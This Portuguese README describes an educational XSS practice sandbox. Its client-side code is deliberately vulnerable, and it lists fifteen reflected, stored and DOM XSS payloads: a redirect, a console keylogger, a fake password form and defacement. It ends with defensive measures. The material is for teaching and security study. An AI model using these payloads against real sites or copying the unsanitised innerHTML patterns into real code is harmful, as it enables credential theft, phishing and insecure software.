# XSS Sandbox

Um ambiente educacional seguro para praticar e estudar vulnerabilidades de Cross-Site Scripting (XSS). Este projeto demonstra três tipos principais de XSS através de cenários práticos e interativos.

## Estrutura do Projeto

```
SiteXSS/
├── index.html    # Página principal com os cenários de teste
├── script.js     # Lógica JavaScript vulnerável
├── style.css     # Estilos visuais com tema dark
└── README.md     # Este arquivo
```

## Propósito Educacional

Este projeto foi desenvolvido exclusivamente para fins educacionais em cibersegurança. Ele demonstra como vulnerabilidades XSS podem ser exploradas em aplicações web reais, permitindo que estudantes e profissionais pratiquem técnicas de identificação e exploração em um ambiente controlado.

**IMPORTANTE**: Use este conhecimento apenas em sistemas onde você tem permissão explícita para testes de segurança.

## Cenários Implementados

### 1. XSS Refletido (Reflected XSS)

**Localização**: Formulário de busca na página principal

**Como funciona**: O valor digitado no campo de busca é refletido diretamente na página sem sanitização adequada. A entrada do usuário é inserida no HTML através de `innerHTML`, permitindo execução de código JavaScript.

**Vulnerabilidade no código**:
```javascript
searchResult.innerHTML = `Exibindo resultados para: ${query}`;
```

**5 Exemplos de Payloads**:

1. **Alert Básico**:
   ```html
   <script>alert('XSS Refletido funcionou!')</script>
   ```
   Exibe um alerta simples para confirmar a vulnerabilidade.

2. **Roubo de Cookie**:
   ```html
   <script>alert('Cookie: ' + document.cookie)</script>
   ```
   Mostra os cookies da sessão atual em um alerta.

3. **Redirecionamento Malicioso**:
   ```html
   <script>window.location.href='https://malicious-site.com'</script>
   ```
   Redireciona o usuário para um site malicioso.

4. **Keylogger Simples**:
   ```html
   <script>document.addEventListener('keypress', function(e) { console.log('Tecla pressionada: ' + e.key); })</script>
   ```
   Registra todas as teclas pressionadas no console do navegador.

5. **Modificação de Conteúdo**:
   ```html
   <script>document.body.innerHTML = '<h1 style="color: red;">Site Comprometido!</h1>'</script>
   ```
   Substitui todo o conteúdo da página por uma mensagem de comprometimento.

### 2. XSS Armazenado (Stored XSS)

**Localização**: Sistema de comentários

**Como funciona**: Os comentários são "armazenados" localmente no DOM e exibidos para todos os usuários. O nome do usuário e o texto do comentário são inseridos diretamente no HTML sem validação.

**Vulnerabilidade no código**:
```javascript
newComment.innerHTML = `<strong>${username}:</strong> ${commentText}`;
```

**5 Exemplos de Payloads**:

1. **Alert no Nome de Usuário**:
   ```html
   Nome: <script>alert('XSS no nome!')</script>
   Comentário: Teste normal
   ```
   Executa JavaScript através do campo de nome.

2. **Imagem Quebrada com Onerror**:
   ```html
   Nome: Usuário
   Comentário: <img src="x" onerror="alert('Imagem quebrada executou XSS!')">
   ```
   Usa o evento onerror de uma imagem inexistente para executar código.

3. **Iframe Malicioso**:
   ```html
   Nome: Atacante
   Comentário: <iframe src="javascript:alert('Iframe XSS')" width="0" height="0"></iframe>
   ```
   Cria um iframe invisível que executa JavaScript.

4. **Event Handler em Link**:
   ```html
   Nome: User
   Comentário: Clique <a href="#" onclick="alert('Link clicado!')">aqui</a> para mais info
   ```
   Adiciona um manipulador de evento onclick em um link.

5. **SVG com JavaScript**:
   ```html
   Nome: SVGUser
   Comentário: <svg onload="alert('SVG XSS executado!')"><rect width="10" height="10"/></svg>
   ```
   Usa SVG com evento onload para executar código.

### 3. XSS Baseado em DOM (DOM XSS)

**Localização**: Ferramenta de ping simulado

**Como funciona**: A entrada do usuário é processada inteiramente pelo JavaScript do lado cliente e inserida no DOM sem passar pelo servidor. O valor é lido do input e escrito diretamente no elemento de resultado.

**Vulnerabilidade no código**:
```javascript
const output = `Iniciando ping simulado para ${target}...`;
networkResult.innerHTML = output;
```

**5 Exemplos de Payloads**:

1. **Script Tag Fechada**:
   ```html
   127.0.0.1</pre><script>alert('DOM XSS!')</script><pre>
   ```
   Fecha a tag pre existente e insere um script.

2. **Manipulação de Estilo**:
   ```html
   localhost</pre><style>body{background: red !important;}</style><pre>
   ```
   Injeta CSS para alterar completamente a aparência da página.

3. **Form Injection**:
   ```html
   8.8.8.8</pre><form><input type="password" placeholder="Digite sua senha"><button>Login</button></form><pre>
   ```
   Injeta um formulário falso para capturar credenciais.

4. **JavaScript Inline**:
   ```html
   google.com" onmouseover="alert('Mouse sobre o texto!')
   ```
   Adiciona um evento que executa quando o mouse passa sobre o texto.

5. **Payload com Múltiplas Tags**:
   ```html
   site.com</pre><div onclick="alert('Clique interceptado!')">Clique aqui</div><script>console.log('Console comprometido')</script><pre>
   ```
   Combina múltiplas técnicas em um único payload.

## Arquivos e Funcionalidades

### index.html

**Objetivo**: Estrutura principal da aplicação com três cenários de teste XSS.

**Componentes principais**:
- Header com título e descrição
- Três seções de teste (Reflected, Stored, DOM XSS)
- Forms para interação do usuário
- Áreas de output para exibir resultados
- Footer com aviso educacional

**5 Elementos importantes**:

1. **Meta Tags de Segurança**: O arquivo não possui Content Security Policy (CSP), permitindo execução de scripts inline.

2. **Formulários Vulneráveis**: Três formulários diferentes que demonstram vetores de ataque distintos.

3. **Divs de Output**: Elementos específicos para exibir resultados que são alvos das injeções XSS.

4. **Links para Fontes Externas**: Google Fonts carregadas externamente, demonstrando dependências de terceiros.

5. **Estrutura Semântica**: HTML5 semântico bem estruturado, facilitando a compreensão dos diferentes cenários.

### script.js

**Objetivo**: Implementar a lógica vulnerável dos três tipos de XSS de forma didática.

**Funcionalidades principais**:
- Event listeners para os formulários
- Manipulação direta do DOM sem sanitização
- Simulação de armazenamento local de comentários
- Lógica de ping simulado

**5 Vulnerabilidades implementadas**:

1. **innerHTML Direto**: Uso de innerHTML sem sanitização para inserir conteúdo do usuário.

2. **Ausência de Validação**: Nenhuma validação ou filtro de entrada nos dados do usuário.

3. **Template Literals Inseguros**: Uso de template literals que interpolam diretamente dados não confiáveis.

4. **Event Prevention sem Sanitização**: Prevenção de comportamento padrão mas sem tratar a segurança dos dados.

5. **DOM Manipulation Insegura**: Criação e inserção de elementos DOM com conteúdo não sanitizado.

### style.css

**Objetivo**: Prover interface visual atrativa e funcional com tema dark para melhor experiência do usuário.

**Características do design**:
- Tema escuro (dark mode)
- Tipografia monospace para aparência técnica
- Layout responsivo e acessível
- Feedback visual para interações
- Cores com contraste adequado

**5 Aspectos do design**:

1. **Variáveis CSS**: Uso de custom properties para facilitar manutenção de cores e temas.

2. **Typography System**: Fonte Roboto Mono para dar aparência técnica e melhorar legibilidade de código.

3. **Interactive Elements**: Estados hover e focus bem definidos para melhor UX.

4. **Layout Containers**: Estrutura de containers que organiza o conteúdo de forma hierárquica.

5. **Output Styling**: Estilização específica para áreas de resultado que destacam a saída dos testes.

## Como Usar

### Pré-requisitos

- Navegador web moderno (Chrome, Firefox, Safari, Edge)
- Nenhuma dependência externa além das fontes do Google

### Execução

1. **Clone ou baixe o projeto**:
   ```bash
   git clone <repository-url>
   cd SiteXSS
   ```

2. **Abra o arquivo HTML**:
   - Duplo clique em `index.html`, ou
   - Abra através do navegador: `file://caminho/para/index.html`

3. **Teste os cenários**:
   - Use os payloads de exemplo fornecidos
   - Experimente criar seus próprios payloads
   - Observe como cada tipo de XSS se comporta

### Dicas para Prática

1. **Comece com exemplos simples**: Use `<script>alert('teste')</script>` para confirmar a vulnerabilidade.

2. **Analise o código fonte**: Examine como cada payload é processado no JavaScript.

3. **Use Developer Tools**: Abra o console do navegador para ver erros e logs.

4. **Experimente variações**: Modifique os payloads para entender diferentes vetores.

5. **Documente descobertas**: Anote quais payloads funcionam e por quê.

## Conceitos de Segurança Demonstrados

### Tipos de XSS

1. **Reflected XSS**: Payload executado imediatamente quando refletido na página.
2. **Stored XSS**: Payload armazenado e executado quando a página é carregada.
3. **DOM XSS**: Payload executado através de manipulação do DOM pelo lado cliente.

### Vetores de Ataque

1. **Script Tags**: `<script>código</script>`
2. **Event Handlers**: `onload`, `onerror`, `onclick`
3. **HTML Injection**: Injeção de tags HTML arbitrárias
4. **Attribute Injection**: Manipulação de atributos de elementos existentes
5. **Protocol Handlers**: `javascript:` URLs

### Impactos Demonstrados

1. **Session Hijacking**: Roubo de cookies e tokens de sessão
2. **Phishing**: Criação de formulários falsos para captura de credenciais
3. **Defacement**: Alteração visual da página
4. **Keylogging**: Captura de teclas digitadas
5. **Redirection**: Redirecionamento para sites maliciosos

## Medidas de Proteção (Para Referência)

### No Frontend

1. **Content Security Policy (CSP)**: Definir políticas restritivas para execução de scripts
2. **Input Sanitization**: Sanitizar todas as entradas do usuário
3. **Output Encoding**: Codificar saídas conforme o contexto
4. **DOM APIs Seguras**: Usar `textContent` ao invés de `innerHTML`
5. **Validation**: Validar entradas no lado cliente e servidor

### No Backend

1. **Input Validation**: Validação rigorosa de todas as entradas
2. **Output Encoding**: Encoding apropriado baseado no contexto de saída
3. **HTTPOnly Cookies**: Configurar cookies como HTTPOnly
4. **CSRF Protection**: Implementar proteção contra CSRF
5. **Security Headers**: Configurar headers de segurança apropriados

## Limitações do Ambiente

1. **Armazenamento Temporário**: Comentários são perdidos ao recarregar a página
2. **Simulação de Servidor**: Não há backend real, apenas simulação cliente-side
3. **Ambiente Local**: Algumas restrições de segurança do navegador podem aplicar
4. **Scope Limitado**: Foca apenas em XSS, não aborda outras vulnerabilidades web
5. **Sem Autenticação**: Não demonstra cenários com sessões reais de usuário

## Recursos Adicionais

### Para Estudo Complementar

1. **OWASP XSS Prevention Cheat Sheet**
2. **PortSwigger Web Security Academy**
3. **MDN Web Security Guidelines**
4. **SANS Secure Coding Practices**
5. **W3C Security Considerations**

### Ferramentas Relacionadas

1. **Burp Suite**: Para testes avançados de aplicações web
2. **OWASP ZAP**: Scanner de vulnerabilidades gratuito
3. **XSSHunter**: Plataforma para detectar XSS blind
4. **BeEF**: Framework de exploração de navegadores
5. **Browser Developer Tools**: Para análise de DOM e debugging

## Contribuição

Este é um projeto educacional. Contribuições são bem-vindas para:

- Adicionar novos cenários de XSS
- Melhorar a documentação
- Corrigir bugs ou melhorar a interface
- Adicionar exemplos de proteção
- Traduzir para outros idiomas

## Licença

Este projeto é disponibilizado apenas para fins educacionais. O uso responsável e ético é fortemente encorajado.

## Aviso Legal

Este projeto foi criado exclusivamente para fins educacionais e de pesquisa em cibersegurança. Os autores não se responsabilizam pelo uso inadequado ou malicioso das técnicas aqui demonstradas. Use este conhecimento apenas em sistemas onde você possui autorização explícita para realizar testes de segurança.
